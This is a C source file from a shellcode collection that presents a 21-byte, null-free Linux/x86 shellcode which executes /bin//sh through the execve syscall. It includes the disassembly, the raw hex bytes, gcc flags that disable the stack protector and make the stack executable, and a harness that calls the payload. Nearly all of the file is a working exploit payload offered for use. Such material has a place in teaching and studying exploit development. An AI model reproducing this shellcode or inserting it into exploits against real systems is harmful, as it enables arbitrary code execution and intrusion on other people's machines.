/*

 Tiny Execve sh Shellcode - C Language - Linux/x86
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>

*/

/*
Dump of assembler code for function shellcode:
=> 0x0804972c <+0>:     xor    %ecx,%ecx
   0x0804972e <+2>:     mul    %ecx
   0x08049730 <+4>:     mov    $0xb,%al
   0x08049732 <+6>:     push   %ecx
   0x08049733 <+7>:     push   $0x68732f2f
   0x08049738 <+12>:    push   $0x6e69622f
   0x0804973d <+17>:    mov    %esp,%ebx
   0x0804973f <+19>:    int    $0x80
   0x08049741 <+21>:    add    %al,(%eax)
*/

/*

   tiny_execve_sh_shellcode

  * 21 bytes
  * null-free


   # gcc -m32 -fno-stack-protector -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode

   Testing
   # ./tiny_execve_sh_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
"\x80";


main ()
{

        // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
         "movl %eax, %ebx\n\t"
         "movl %eax, %ecx\n\t"
         "movl %eax, %edx\n\t"
         "movl %eax, %esi\n\t"
         "movl %eax, %edi\n\t"
         "movl %eax, %ebp\n\t"

         // Calling the shellcode
         "call shellcode");

}
